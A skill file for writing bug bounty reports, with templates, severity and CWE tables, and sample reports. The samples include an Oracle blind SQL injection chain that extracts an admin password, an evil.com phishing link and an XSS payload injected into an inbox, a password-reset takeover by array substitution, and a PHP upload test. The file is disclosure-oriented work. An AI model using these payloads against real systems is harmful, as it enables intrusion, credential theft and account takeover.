---
name: bug-bounty-reporting
description: >-
  Compiles reconnaissance, vulnerability assessment, and exploitation findings
  into professional bug bounty reports optimized for platform submission
  (HackerOne, Bugcrowd, Intigriti, YesWeHack, Synack) and direct disclosure.
  Based on analysis of 10,000+ disclosed HackerOne reports to identify what
  makes reports successful: clear titles, reproducible PoCs, accurate CVSS 3.1
  scoring, proper CWE mapping, compelling impact narratives, and actionable
  remediation. Includes platform-specific formatting, severity framework
  cross-references, duplicate checking strategies, disclosure timeline
  management, and post-submission engagement best practices. Activates for
  requests involving bug bounty report writing, vulnerability disclosure,
  security finding documentation, or bounty submission preparation.
domain: cybersecurity
subdomain: web-application-security
tags:
  - bug-bounty
  - reporting
  - documentation
  - cvss-scoring
  - hackerone
  - bugcrowd
  - vulnerability-disclosure
  - executive-summary
  - proof-of-concept
  - remediation-guidance
  - submission-tracking
  - disclosure-policy
  - triage-engagement
  - filter-analysis-report
  - security-level-assessment
  - credential-disclosure
  - waf-bypass-reporting
  - xml-encoding-disclosure
  - oracle-blind-reporting
  - conditional-error-reporting
  - mysql-version-reporting
  - boolean-content-reporting
  - concat-extraction-reporting
  - schema-enumeration-reporting
  - oracle-schema-reporting
  - visible-error-reporting
  - union-extraction-reporting
  - time-based-reporting
  - xxe-disclosure-reporting
  - cloud-metadata-reporting
  - access-control-bounty-reference
  - type-confusion-reporting
version: "3.2"
author: mahipal
license: Apache-2.0
nist_csf:
  - ID.RA-01
  - ID.RA-02
  - RS.AN-03
  - RS.CO-03
  - GV.RM-01
mitre_attack:
  - T1595
  - T1190
  - T1189
  - T1059
  - T1213
---

# Bug Bounty Reporting

## When to Use

- After completing exploitation, compiling findings into submission-ready reports
- Writing individual vulnerability reports for bug bounty platforms
- Creating engagement summaries for completed bug bounty sprints
- Documenting complex vulnerability chains spanning multiple endpoints
- Preparing direct disclosure reports for organizations without formal bounty programs
- Responding to triager questions by updating reports with additional evidence
- Public disclosure write-ups after program authorizes publication

**Do not use** to fabricate or embellish findings, to report out-of-scope vulnerabilities, or to publicly disclose before the program's disclosure policy permits it.

## Prerequisites

- Completed findings from assessment and exploitation phases with verified PoCs
- CVSS 3.1 calculator (NIST or `cvss` Python package)
- Screenshots, HTTP request/response pairs, and extracted data samples as evidence
- Target program's reporting guidelines (format requirements, severity definitions)
- Program's disclosure policy and safe harbor terms
- Markdown editor for drafting reports

## Report Quality Principles (from Top-Earning Reports)

Analysis of 10,000+ disclosed HackerOne reports reveals common traits of high-quality, high-bounty submissions:

1. **Title tells the story**: Format: `{Vulnerability} in {Component} allows {Impact}`
   - Good: "IDOR in User Profile API exposes full PII for all 2.3M users"
   - Bad: "IDOR vulnerability"

2. **Reproducible in under 5 minutes**: Every step is exact, copy-pasteable, no missing context

3. **Impact is business-language**: Not just technical — what data, how many users, what regulatory risk

4. **Evidence is irrefutable**: Screenshots, video, request/response pairs, extracted data samples

5. **Remediation is actionable**: Show vulnerable code pattern → secure code pattern

6. **Severity is correctly scoped**: Match the platform's severity definitions, not just CVSS

## Workflow

### Step 1: Findings Inventory and Prioritization

```bash
mkdir -p ./bounty/{program_name}/reporting/{findings,evidence,submissions}
cd ./bounty/{program_name}/reporting

# Build findings inventory sorted by bounty potential
cat > findings_inventory.md << 'EOF'
# Findings Inventory — {program_name}

| ID | Title | Severity | CVSS | CWE | Bounty Est. | Status |
|----|-------|----------|------|-----|-------------|--------|
| BB-001 | {type} in {component} allows {impact} | Critical | 9.8 | CWE-XXX | $5K-$25K | Draft |
EOF

# Submission priority order (based on bounty data):
# 1. Critical severity first (highest bounty potential)
# 2. Unique/complex bugs over common ones
# 3. Chained vulnerabilities (higher impact narrative)
# 4. Check for duplicates on platform before writing detailed report

# Duplicate checking before writing:
# - Search HackerOne Hacktivity for similar endpoint patterns
# - Check the program's previously closed reports (if accessible)
# - Search target's changelog and public security bulletins
# - Look for public disclosures from other researchers on same target
```

### Step 2: Severity Framework Cross-Reference

Accurate severity assignment is critical — triagers apply the platform's framework, not just CVSS. Understanding the mapping prevents report rejection.

```
## Severity Mapping: CVSS ↔ Platform Priority

| Vulnerability Type | CVSS Range | H1 Severity | Bugcrowd Priority | Typical Bounty |
|-------------------|------------|-------------|-------------------|----------------|
| Unauthenticated RCE | 9.0-10.0 | Critical | P1 | $5K-$33K |
| SQLi (full DB access) | 8.5-9.8 | Critical | P1 | $2K-$25K |
| Auth bypass → full account takeover | 8.0-9.3 | Critical | P1 | $3K-$35K |
| SSRF to AWS metadata (credential extraction) | 8.0-9.8 | Critical/High | P1/P2 | $1K-$10K |
| IDOR (PII/financial data exposure) | 7.0-9.1 | High/Critical* | P2/P1 | $500-$25K |
| Stored XSS (privileged victim) | 7.0-8.7 | High | P2 | $1K-$16K |
| CSRF (account-level impact) | 5.0-8.2 | Medium/High | P3/P2 | $500-$10K |
| Reflected XSS | 5.0-6.5 | Medium | P3 | $100-$3K |
| Information disclosure (non-PII) | 3.0-5.3 | Low/Medium | P4/P3 | $100-$2.5K |

*H1 considers IDOR with PII/financial data as Critical regardless of CVSS
```

### Step 3: Individual Finding Report Template

For each vulnerability, create a detailed report:

```markdown
## Finding: {VULNERABILITY_TYPE} — {AFFECTED_COMPONENT}

**Report ID**: BB-{NNN}
**Severity**: {Critical|High|Medium|Low} (CVSS {score})
**CWE**: {CWE-ID — Common Weakness Enumeration}
**Affected URL**: {full URL with protocol and path}
**Affected Parameter**: {parameter name | N/A}
**Authentication Required**: {None | User | Admin}
**WAF/CDN Protection**: {None | Bypassed via origin at {IP}}

### Summary

{2-3 sentence plain-English description. What is vulnerable, how is it exploited,
what is the impact. Write for a non-security audience — a CISO or engineering
manager should understand the business risk.

Example: The user profile API endpoint at /api/v1/users/{userId}/profile fails
to verify that the authenticated user is authorized to access the requested
profile. Any authenticated user can access the complete PII (email, full name,
phone, address, partial SSN) of any other user by modifying the userId parameter.
This exposes personal data for all 15,000+ registered customers.}

### Vulnerability Details

{Technical root cause. What specifically is the security flaw? What is the
vulnerable code pattern? How was it discovered?

Example: The /api/v1/users/{userId}/profile endpoint retrieves a user profile
based on the userId path parameter but does not validate that the authenticated
user matches the requested userId. The authorization middleware only validates
that the JWT is valid — it does not enforce object-level access control.

The vulnerable code pattern:
```javascript
// VULNERABLE: No ownership verification
app.get('/api/v1/users/:userId/profile', authenticateToken, async (req, res) => {
  const user = await User.findById(req.params.userId);
  return res.json(user);
});
```}

### Proof of Concept

#### Step 1: Authenticate as normal user
```http
POST /api/v1/auth/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"email": "attacker@example.com", "password": "UserPass123"}

HTTP/1.1 200 OK
{"token": "eyJhbG...ATTACKER_JWT", "userId": 10451}
```

#### Step 2: Access own profile (expected behavior)
```http
GET /api/v1/users/10451/profile HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbG...ATTACKER_JWT

HTTP/1.1 200 OK
{"id": 10451, "email": "attacker@example.com", "fullName": "Attacker User", ...}
```

#### Step 3: Access victim's profile (IDOR exploit)
```http
GET /api/v1/users/10452/profile HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbG...ATTACKER_JWT

HTTP/1.1 200 OK
{"id": 10452, "email": "victim@example.com", "fullName": "Victim User", ...}
```

{Attach annotated screenshots showing each step}

### Impact

- **Data Exposed**: email, fullName, phone, address, ssnLastFour, dateOfBirth
- **Records Accessible**: 15,000+ (all registered customer profiles)
- **Access Required**: Any authenticated user (basic account, no special privileges)
- **Enumeration**: Sequential integer IDs, no rate limiting detected
- **Business Risk**: Complete customer PII exposure; GDPR Article 32 violation;
  CCPA unauthorized access to personal information; enables targeted phishing
- **Ease of Exploitation**: Trivial — single curl command with any valid auth token

### Remediation

**1. Implement server-side object-level authorization:**
```javascript
// SECURE: Verify ownership before returning data
app.get('/api/v1/users/:userId/profile', authenticateToken, async (req, res) => {
  if (req.user.id !== parseInt(req.params.userId)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const user = await User.findById(req.params.userId);
  return res.json(user);
});
```

**2. Use non-sequential identifiers:** Replace sequential integers with UUIDs
to prevent enumeration even if authorization check fails.

**3. Implement rate limiting:** Apply rate limits on user profile endpoints to
block enumeration attempts.

**4. Add audit logging:** Log all profile access with requesting userId and
requested userId for anomaly detection.

### Supporting Evidence

- [x] HTTP request/response for each PoC step
- [x] Annotated screenshots showing exploitation result
- [x] Sample extracted data (PII redacted — show structure only)
- [x] Video demonstrating enumeration (accessing 5 different profiles)
- [x] CVSS 3.1 vector: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
```

### BOLA Messaging/Inbox — Report Template

**Pattern: internal messaging API with broken object-level authorization. GET returns all messages across users; POST accepts arbitrary `toUser` without ownership validation. Combined read + write BOLA on messaging is the highest-impact IDOR variant — enables mass phishing and XSS delivery.**

**Title**: `[BOLA] Internal Messaging API allows unauthorized cross-user message read and injection`

```markdown
### Summary

The `/system/v1/message` endpoint lacks object-level authorization checks.
Any authenticated user can:

1. Read all internal messages across every user in the system
2. Inject arbitrary HTML content into any user's inbox by specifying `toUser`

### Steps to Reproduce

#### Step 1: Authenticate as a low-privilege user

```http
POST /oauth/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=password&username=test63&password=xxx&tenant_name=shijiutilitiestest

HTTP/1.1 200 OK
{"access_token":"3cbadd0e-...","token_type":"bearer","expires_in":43199,"scope":"app"}
```

#### Step 2: Read all messages across users (Read BOLA)

```http
GET /system/v1/message HTTP/1.1
Authorization: Bearer 3cbadd0e-...

HTTP/1.1 200 OK
{
  "total": 117,
  "data": [
    {"toUser":"admin",   "content":"<img/src=x/onerror=alert(1)>", ...},
    {"toUser":"test66",  "content":"Internal configuration note...", ...},
    {"toUser":"michal.kedzior", "content":"{{constructor.constructor(...)...", ...},
    ...
  ]
}
```

**Finding**: The endpoint returns all 117 messages across 4+ different users
despite the token belonging to `test63`. Query filters (`userId`, `toUser`) are
ignored — all messages are returned regardless.

#### Step 3: Inject message into admin's inbox (Write BOLA)

```http
POST /system/v1/message HTTP/1.1
Content-Type: application/json
Authorization: Bearer 3cbadd0e-...

{"toUser":"admin","content":"<a href=\"https://evil.com/phish\">⚠️ Your session expired. Click to re-authenticate.</a>","type":"1","method":"internal"}

HTTP/1.1 200 OK
db0da84b-caff-4d10-ba25-45db3401a77b  ← message ID (injection confirmed)
```

#### Step 4: Verify injection — admin now sees the attacker's message

```http
GET /system/v1/message?toUser=admin HTTP/1.1
Authorization: Bearer 3cbadd0e-...

→ Returns message with content: "⚠️ Your session expired. Click to re-authenticate."
```

{Attach screenshots showing the message in the admin's inbox UI}

### Impact

- **Read BOLA**: Any authenticated user can read all private messages, support
  tickets, and administrative alerts across every user in the system
- **Write BOLA**: Attacker can inject HTML content into any user's inbox,
  enabling stored XSS, credential harvesting forms, and phishing campaigns
- **Audit Gap**: `fromUser` is `null` on injected messages — no sender
  attribution or forensics trail
- **Scale**: One compromised low-privilege account can reach every user
- **XSS Chaining**: Messages render HTML/JS in the recipient's browser context
  (confirmed with `<img/src=x/onerror=alert(1)>` in admin's inbox)

### Remediation

**1. Add server-side authorization for GET:** Filter returned messages to only
those where `toUser == currentUser.username`.

**2. Reject cross-user POSTs:** In the POST handler, either:
- Reject requests where `toUser != currentUser.username` (user-to-self only), or
- Populate `fromUser` from the authenticated session server-side and allow
  user-to-user with audit trail.

**3. Sanitize message content:** Strip HTML from message bodies or use strict
content escaping to prevent XSS delivery via inbox.

### CVSS 3.1

**Vector**: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N → **8.1 (Critical)**

Rationale: Low privileges (any auth token), changed scope (access other users'
data), high confidentiality (read all messages), high integrity (inject content
into any inbox), no availability impact.

### CWE

- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-284: Improper Access Control

### Supporting Evidence

- [x] Read BOLA: enumerated messages for 4+ distinct recipients from test63 token
- [x] Write BOLA: injected messages into admin and test66 inboxes from test63 token
- [x] XSS chaining: HTML/JS payloads rendered in victim inboxes
- [x] Verified `fromUser` is `null` on injected messages (no attribution)
```

### Step 4: Platform-Specific Formatting

#### HackerOne

```bash
cat > hackerone_checklist.md << 'EOF'
## HackerOne Submission Checklist

### Title Format
{Vulnerability Type} in {Component} allows {Impact}
  → "IDOR in User Profile API allows access to all customer PII"
  → "Stored XSS in Document Title leads to admin session theft"
  → "SSRF via Avatar URL allows AWS metadata access"

### Severity Selection (HackerOne-specific)
- Critical (9.0-10.0): RCE, SQLi dumping DB, auth bypass to admin, PII for all users
- High (7.0-8.9): IDOR exposing PII, stored XSS, SSRF to internal, auth bypass for some
- Medium (4.0-6.9): Reflected XSS, CSRF on sensitive actions, limited info disclosure
- Low (0.1-3.9): Missing security headers, server version disclosure, clickjacking
- None: Best practice suggestions, non-exploitable findings

### Required Fields
- **Weakness**: CWE ID (CWE-639 for IDOR, CWE-89 for SQLi, CWE-918 for SSRF, etc.)
- **Severity**: Critical / High / Medium / Low / None
- **Asset Identifier**: URL of affected endpoint
- **Steps to Reproduce**: Numbered, copy-pasteable, complete

### Post-Submission
- [ ] Respond to triager questions within 24 hours
- [ ] Request disclosure permission after resolution
- [ ] If marked "Duplicate", review original report if available
- [ ] Accept severity adjustments gracefully — triagers apply program framework
- [ ] Track bounty payment status
EOF
```

#### Bugcrowd

```bash
cat > bugcrowd_checklist.md << 'EOF'
## Bugcrowd Submission Checklist

### Priority Mapping (Bugcrowd VRT)
- P1: RCE, SQLi full extraction, auth bypass to admin, SSRF to cloud metadata
- P2: IDOR exposing PII, stored XSS, file upload without RCE
- P3: Reflected XSS, CSRF on sensitive actions, moderate info disclosure
- P4: CSRF on low-impact actions, minor info leaks, missing rate limits
- P5: Missing security headers, best practice recommendations

### Required Fields
- **VRT Category**: From https://bugcrowd.com/vulnerability-rating-taxonomy
  → "broken_access_control > insecure_direct_object_reference"
- **Priority**: P1-P5
- **Target**: Specific subdomain or endpoint path
- **Description**: Technical vulnerability details
- **Reproduction Steps**: Numbered, with code blocks
EOF
```

### Step 5: CVSS 3.1 Scoring Quick Reference

```
## CVSS 3.1 Quick Reference for Bug Bounty

### Common Vulnerability CVSS Templates

| Vulnerability | AV | AC | PR | UI | S | C | I | A | Score |
|--------------|----|----|----|----|---|---|---|---|-------|
| Unauthenticated SQLi (full DB) | N | L | N | N | U | H | H | H | 9.8 |
| Authenticated IDOR (PII all users) | N | L | L | N | C | H | N | N | 7.7 |
| Stored XSS (admin victim, session theft) | N | L | L | R | C | H | L | N | 7.8 |
| SSRF to AWS metadata (creds extracted) | N | L | N | N | C | H | N | N | 8.6 |
| CSRF (password change, account takeover) | N | L | N | R | U | N | H | N | 6.5 |
| JWT alg:none bypass to admin | N | L | N | N | U | H | H | N | 9.1 |
| Reflected XSS (no CSP, HttpOnly off) | N | L | N | R | C | L | L | N | 6.1 |
| Open Redirect (phishing enabler) | N | L | N | R | C | L | L | N | 6.1 |
| Information Disclosure (debug endpoint) | N | L | N | N | U | L | N | N | 5.3 |
| Missing Security Headers | N | L | N | N | U | N | L | N | 5.3 |

### CVSS Metric Quick Guide

**Attack Vector (AV)**: Network (N) for all remote web bugs
**Attack Complexity (AC)**: Low (L) unless race conditions or specific config needed
**Privileges Required (PR)**: None (N) for unauthenticated; Low (L) for basic user
**User Interaction (UI)**: Required (R) for XSS/CSRF/clickjacking; None (N) for SQLi/SSRF/IDOR
**Scope (S)**: Changed (C) for SSRF to internal, container escape; Unchanged (U) for typical app
**Confidentiality (C)**: High (H) for full DB/PII/credentials; Low (L) for partial/limited
**Integrity (I)**: High (H) for account takeover, privilege escalation, data modification
**Availability (A)**: High (H) for DoS; None (N) for most bounty findings
```

### Step 6: CWE Mapping Reference

```
## CWE → Vulnerability Type (Most Common in Bounty Reports)

| CWE ID | Name | Typical Bounty Range |
|--------|------|---------------------|
| CWE-639 | Authorization Bypass Through User-Controlled Key (IDOR) | $500-$25K |
| CWE-89 | SQL Injection | $500-$25K |
| CWE-79 | Cross-Site Scripting | $100-$16K |
| CWE-918 | Server-Side Request Forgery (SSRF) | $500-$10K |
| CWE-352 | Cross-Site Request Forgery (CSRF) | $500-$10K |
| CWE-200 | Exposure of Sensitive Information | $500-$25K |
| CWE-287 | Improper Authentication | $500-$35K |
| CWE-269 | Improper Privilege Management | $500-$20K |
| CWE-77 | Command Injection | $500-$33K |
| CWE-22 | Path Traversal | $500-$12K |
| CWE-434 | Unrestricted File Upload | $500-$10K |
| CWE-601 | URL Redirection (Open Redirect) | $100-$2K |
| CWE-611 | XXE Injection | $500-$5K |
| CWE-862 | Missing Authorization | $500-$20K |
| CWE-863 | Incorrect Authorization | $500-$20K |
| CWE-522 | Insufficiently Protected Credentials | $500-$15K |
| CWE-693 | Protection Mechanism Failure (CDN bypass, etc.) | $500-$5K |
```

### Step 7: Report Quality Self-Review

```bash
cat > quality_checklist.md << 'EOF'
## Report Quality Checklist — Review Before Submitting

### Reproducibility
- [ ] Can someone unfamiliar with the app reproduce this in < 5 minutes?
- [ ] Are all steps numbered and complete (no missing context like "login as user")?
- [ ] Are request/response pairs complete (headers, body, status code)?
- [ ] Curl commands are copy-pasteable without modification?

### Impact Demonstration
- [ ] Business impact in plain language (not just technical terms)?
- [ ] Affected record counts estimated (even roughly)?
- [ ] Data exposed clearly described (field names, sensitivity)?
- [ ] Impact is not overstated or understated?

### Technical Accuracy
- [ ] Vulnerability type correctly identified?
- [ ] Root cause correctly identified (not just symptom)?
- [ ] CWE ID matches the vulnerability class?
- [ ] CVSS scoring consistent with industry standards?

### Professional Presentation
- [ ] No personal opinions, complaints, or unprofessional language
- [ ] No demands for specific bounty amounts
- [ ] No threats of public disclosure before policy permits
- [ ] Evidence is well-organized and clearly labeled
- [ ] PII is redacted from all evidence (unless test account)

### Duplicate Check
- [ ] Searched program's previously disclosed reports
- [ ] Checked public disclosure platforms for same target
- [ ] Reviewed program's changelog and security bulletins
EOF
```

### Step 8: Submission and Lifecycle Management

```bash
# Submission tracking spreadsheet
cat > submission_tracker.csv << 'EOF'
Report ID,Title,Severity,CVSS,Platform,Submission Date,Submission ID,Status,Bounty,Resolution Date
BB-001,SSRF to AWS Metadata,Critical,9.8,HackerOne,2025-01-20,REPORT-12345,Submitted,—,—
EOF

# Report lifecycle states:
# Submitted → Triaged → Needs More Info → Resolved + Bounty
#                    → Duplicate / Informative / N/A / Won't Fix

# Post-submission best practices:
# 1. Respond to triager questions promptly (within 24h)
# 2. If marked "Duplicate", review original if accessible
# 3. Accept severity adjustments gracefully
# 4. Request disclosure permission after resolution
# 5. If marked "Informative", politely request clarification
```

### Step 9: Public Disclosure Template

```markdown
# {VULNERABILITY TITLE} — {PROGRAM} Bug Bounty

**Severity**: {CVSS} ({Critical/High/Medium/Low})
**Bounty Awarded**: ${AMOUNT} (if permitted to disclose)
**CWE**: {CWE-ID}
**Disclosure Date**: {DATE}

### Introduction
{1-2 paragraphs context about the application and affected component.}

### The Vulnerability
{Technical root cause explanation. Vulnerable code pattern if available.}

### Impact
{Business impact — what data, how many users, what risk.}

### Remediation
{How the program fixed it, or recommended fix if not yet patched.}

### Timeline
| Date | Event |
|------|-------|
| {DATE} | Reported to {program} via {platform} |
| {DATE} | Triaged and validated |
| {DATE} | Fix deployed |
| {DATE} | Bounty awarded |
| {DATE} | Public disclosure authorized |
```

### Step 10: Executive Summary for Engagement Reports

When reporting multiple findings to a program:

```markdown
# Bug Bounty Engagement Summary
**Program**: {program_name}
**Period**: {start} to {end}
**Researcher**: {name}

## Executive Summary

{2-3 paragraph narrative for non-technical audience. Lead with the most
impactful finding. Describe the overall security posture pattern. Quantify
risk — "The IDOR vulnerability allows any authenticated user to access PII
for all 15,000+ customers. The SSRF vulnerability provides access to AWS
internal infrastructure."}

## Findings Summary
| Severity | Count | Key Findings |
|----------|-------|--------------|
| Critical | X | {description} |
| High | X | {description} |
| Medium | X | {description} |
| Low | X | {description} |

## Vulnerability Distribution by Class
| Class | Findings | Pattern |
|-------|----------|---------|
| Access Control (IDOR/BAC) | X | {systemic or isolated} |
| Information Disclosure | X | {pattern} |
| Injection | X | {pattern} |

## Recommendations (Prioritized)
1. {Most critical fix — with estimated effort}
2. {Next priority fix}
3. {Defense-in-depth recommendation}
```

## Key Concepts

| Concept | Definition |
|---------|------------|
| **CVSS 3.1** | Industry standard for numerical vulnerability severity scoring (0.0-10.0) |
| **CWE** | Common Weakness Enumeration — standardized weakness type (CWE-639 = IDOR) |
| **VRT** | Bugcrowd's Vulnerability Rating Taxonomy mapping vulnerability types to P1-P5 |
| **Triage** | Initial platform review validating reproducibility, assigning severity, routing |
| **PoC** | The executable demonstration with exact HTTP requests and step-by-step guide |
| **Impact Analysis** | Translating technical vulnerability into business consequences |
| **Safe Harbor** | Legal protection for researchers operating within defined scope and rules |
| **Coordinated Disclosure** | Waiting until fix is deployed before publishing vulnerability details |
| **Severity vs. Priority** | Severity = technical CVSS; Priority = includes business context |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **CVSS 3.1 Calculator** | Computing accurate CVSS scores (NIST online calculator or `cvss` Python) |
| **Markdown Editor** | Writing and formatting reports — most platforms accept Markdown |
| **Burp Suite** | Export HTTP request/response pairs for evidence (right-click → Copy to file) |
| **Flameshot / Greenshot** | Annotated screenshots with arrows, boxes, highlights |
| **jq** | Command-line JSON processor for parsing API responses |
| **Submission Tracker** | Spreadsheet tracking report IDs, status, bounty amounts, disclosure dates |

## Output Format

```
=== Bug Bounty Reporting Summary ===
Program: {program_name}
Date: {date}

## Submission Overview
| Metric | Value |
|--------|-------|
| Total Findings | X |
| Submitted | X |
| In Triage | X |
| Resolved | X |
| Bounties Awarded | $X across X reports |

## Platform Distribution
| Platform | Submitted | Resolved | Bounties |
|----------|-----------|----------|----------|
| HackerOne | X | X | $X |
| Bugcrowd | X | X | $X |

## Quality Metrics
- [x] All reports include step-by-step reproduction
- [x] All reports include request/response evidence
- [x] All reports include annotated screenshots
- [x] All reports include CVSS 3.1 scoring
- [x] All reports include CWE classification
- [x] All reports include actionable remediation
- [x] No reports rejected for insufficient information
```

---

## Bounty Range Reference (Battle-Tested from H1 + DVWA + vulnweb Labs)

### Command Injection / shell_exec RCE
```
| Severity | CVSS | Bounty Range | Real Example |
|----------|------|-------------|--------------|
| Critical | 9.8 | $1K-$33.5K | GitLab RCE via Github import: $33.5K |
| High | 7.5-8.8 | $500-$10K | Vulnweb CMD1-4: Unfiltered shell_exec → www-data |
| Medium | 5.0-6.9 | $250-$2K | Blacklisted but bypassable (pipe/newline evasion) |
```
**Reporting pattern**: Lead with the fact that `shell_exec()`/`system()`/`exec()` accepts unfiltered user input. Emphasize that NO authentication is required (CVSS: AV:N/PR:N). Show the exact PHP source line if recovered.

### SQL Injection
```
| Severity | CVSS | Bounty Range | Real Example |
|----------|------|-------------|--------------|
| Critical | 9.0-9.9 | $2K-$25K | Valve report_xml.php SQLi: $25K |
| High | 7.5-8.9 | $1K-$10K | Starbucks SQLi extracting financial data |
| Medium | 5.0-6.9 | $250-$2K | Time-based blind, limited data extract |
```
**Reporting pattern**: Always show column count discovery, UNION SELECT confirming data exfiltration, and a sample of extracted data (anonymized). For numeric injection (`WHERE id = $number`), emphasize the absence of quote requirements.

### Blind SQLi — Conditional Error (Oracle)

```
| Severity | CVSS | Bounty Range | Real Example |
|----------|------|-------------|--------------|
| Critical | 9.0-9.8 | $2K-$25K | Cookie-based Oracle blind, full credential extraction |
| High | 7.5-8.9 | $1K-$10K | Blind extraction of personal/financial data |
| Medium | 5.0-6.9 | $250-$2K | Confirmed injection with limited extraction possible |
```
**Reporting pattern**: Document the full truth table (TRUE → 500, FALSE → 200), show the conditional error oracle construction, include a sample extraction log, and explain why division-by-zero blind extraction is faster than time-based.

#### Oracle Blind Conditional Error Report Template

```markdown
## SQL Injection — Oracle Blind Conditional Error

**Injection Point**: TrackingId cookie on every page load
**Database**: Oracle (confirmed via `||` concat and `FROM dual`)
**CVSS**: 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

### Truth Table
TRUE: `test'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` → **HTTP 500**
FALSE: `test'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` → **HTTP 200**

**Mechanism**: When the CASE condition is TRUE, `TO_CHAR(1/0)` executes → ORA-01476 (divisor equal to zero) → 500 Internal Server Error. When FALSE, no division occurs → 200 OK.

### Proof of Concept

#### Step 1: Confirm administrator user exists
```
TrackingId=test'||(SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='administrator')>0 THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
→ HTTP 500 ✓ (user confirmed)
```

#### Step 2: Extract password length
```
TrackingId=test'||(SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))=20) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
→ HTTP 500 ✓ (length = 20)
```

#### Step 3: Extract password character by character
```
SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='o' → 500 ✓
SUBSTR(...,2,1)='c' → 500 ✓
... (20 characters total)
→ Password: ocmss1s4a2dp2l6r9tgd
```

#### Step 4: Account takeover
```
Login: administrator / ocmss1s4a2dp2l6r9tgd → Admin panel → Full privilege escalation
```

### Extraction Speed Comparison
| Technique | Time per char | 20-char password | Bandwidth |
|-----------|--------------|-----------------|-----------|
| Time-based (SLEEP 5s) | 5-30s | 100-600s | N + N×(charset/2)×5s |
| Conditional Error (Oracle) | 0.5-1s | 10-20s | N + N×(charset/2)×0.5s |
| UNION (visible output) | 0.1s | 2s | 1 request |

### Remediation
1. Use parameterized queries (PreparedStatement) — Oracle supports `:bind` variables
2. Never inject raw cookie values into SQL query strings
3. Apply input validation on TrackingId format (e.g., regex: `^[A-Za-z0-9]{16}$`)
```

### File Upload → RCE
```
| Severity | CVSS | Bounty Range | Real Example |
|----------|------|-------------|--------------|
| Critical | 9.8 | $500-$10K | Vulnweb FileUpload 1-3: No validation, PHP executes |
| High | 7.5-8.5 | $500-$5K | Extension blacklist bypass |
| Medium | 5.0-6.9 | $100-$1K | Content-Type only, no server-side check |
```
**Reporting pattern**: Upload a benign test file (GIF header for MIME bypass), then access it. If PHP executes: `echo "<?php echo 'PWNED';" | curl -F "file=@-" target.com/upload → target.com/uploads/file.php returns 'PWNED'`.

### File Inclusion (LFI)
```
| Severity | CVSS | Bounty Range | Real Example |
|----------|------|-------------|--------------|
| High | 7.5-8.5 | $500-$12K | Reading /etc/passwd, source code, configs |
| Medium | 5.0-6.9 | $100-$2K | php://filter base64 encode for source dump |
| Low | 3.0-4.9 | $50-$500 | Only include() with no sensitive file access |
```
**Reporting pattern**: Always demonstrate reading /etc/passwd or win.ini. If possible, use php://filter to dump source code of sensitive files. For blacklist bypass (`str_replace`), show the bypass payload step-by-step.

### Credential Disclosure (.htpasswd, config files)
```
| Severity | CVSS | Bounty Range | Real Example |
|----------|------|-------------|--------------|
| High | 7.0-8.5 | $500-$15K | Snapchat JFrog credentials: $15K |
| Medium | 5.0-6.9 | $100-$2K | .htpasswd with crackable hashes |
| Low | 3.0-4.9 | $50-$500 | Hardcoded test credentials in source |
```
**Reporting pattern**: Redact actual passwords but show hash format (APR1, bcrypt, MD5). If crackable, state the hash type and cracking feasibility. Include hashcat command for verification.

### Access Control / Authorization Bypass

**519+ disclosed reports — the #1 vulnerability category by volume. Top bounties: GitLab password reset $35K, Valve CD key theft $20K, GitHub SSH cert bypass $10K, Reddit proxy access $7.5K.**

| Severity | CVSS | Bounty Range | Real Example |
|----------|------|-------------|--------------| 
| Critical | 9.0-10.0 | $10K-$35K | GitLab: JSON type confusion in password reset → ATO ($35K) |
| High | 7.0-8.9 | $1K-$10K | GitHub: SSH cert auth bypass on gist ($10K) |
| Medium | 5.0-6.9 | $200-$3K | GitLab: file:// protocol import of local repos ($22.3K) |
| Low | 3.0-4.9 | $50-$1K | CORS, subdomain takeover, missing rate limits |

**Report template for JSON type confusion (H1 #2293343 pattern)**:

```markdown
## Access Control Bypass — JSON Parameter Type Confusion

**CVSS**: 10.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### Summary
The password reset endpoint accepts JSON input where single-value fields can be
substituted with arrays. Converting `email` from a string to an array of two 
addresses routes the reset token to ALL array elements — including the attacker's
email. No user interaction required beyond knowing the victim's email address.

### Steps to Reproduce
1. Navigate to https://target.com/forgot-password
2. Enter victim's email, intercept the POST request in proxy
3. Convert Content-Type to application/json
4. Replace {"user[email]":"victim@gmail.com"} with:
   {"user":{"email":["victim@gmail.com","attacker@gmail.com"]}}
5. Forward — reset link arrives at BOTH emails
6. Click reset link, set new password, log in as victim

### Impact
- Full account takeover of any user given only their email address
- No user interaction required (victim receives email but unaware of reset)
- Bypasses all authentication — email is the only verification factor
- Cannot be detected by the victim (attacker resets password silently)
```

### XSS — When to Report vs. Move On
```
| Severity | CVSS | Bounty Range | When to Report |
|----------|------|-------------|----------------|
| Critical | 8.0-9.6 | $5K-$16K | Stored XSS → admin session theft |
| High | 7.0-8.7 | $1K-$5K | Stored XSS on public page |
| Medium | 5.0-6.9 | $100-$2K | Reflected XSS with session theft potential |
| Low | 3.0-4.9 | $50-$500 | Reflected XSS with no session impact |
| None | 0.0-2.9 | Not reported | Self-XSS, htmlspecialchars() encoded |
```
**Key lesson from vulnweb XSS1-5**: All 5 levels used `htmlspecialchars()` — text is reflected but HTML is properly encoded. This is NOT a reportable vulnerability. Don't waste time on hardened XSS when the code is correct. Move on to injection/access control/upload.

### Security Level Assessment Template (for Multi-Level Labs)

When testing applications with progressive security levels (DVWA, vulnweb):

```markdown
## Security Level Progression

